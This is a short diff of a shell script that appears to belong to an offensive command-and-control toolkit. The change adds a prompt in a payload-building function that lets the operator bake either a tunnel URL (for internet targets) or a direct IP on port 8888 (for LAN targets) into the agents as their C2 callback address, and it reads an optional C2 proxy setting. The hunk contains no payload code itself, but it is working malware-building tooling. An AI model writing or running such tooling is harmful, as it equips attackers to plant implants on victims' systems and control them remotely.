@@ -6037,8 +6037,19 @@ cmd_payload() {
         err "Tunnel failed — check $OP/logs/tunnel.log"; exit 1
     fi
 
-    # Bake URL into agents
-    C2URL="$TUNNEL_URL"
+    ok "Tunnel: $TUNNEL_URL"
+    echo ""
+    echo -e "  ${C}Bake C2 URL as:${N}"
+    echo -e "  [1] Tunnel URL  — ${W}$TUNNEL_URL${N}  (internet targets)"
+    echo -e "  [2] Direct IP   — ${W}http://$MY_IP:8888${N}  (local VM / LAN targets)"
+    ask "Choice [1/2] (default 1):"
+    read -r _BAKE_CHOICE
+    if [ "$_BAKE_CHOICE" = "2" ]; then
+        C2URL="http://$MY_IP:8888"
+        ok "Baking with direct IP: $C2URL"
+    else
+        C2URL="$TUNNEL_URL"
+    fi
     # C2_PROXY: read from env or ~/.wizza_config; blank = direct
     C2PROXY="${C2_PROXY_BAKE:-}"
     [ -z "$C2PROXY" ] && C2PROXY=$(grep '^C2_PROXY=' "$WIZZA_CFG" 2>/dev/null | cut -d'=' -f2-)
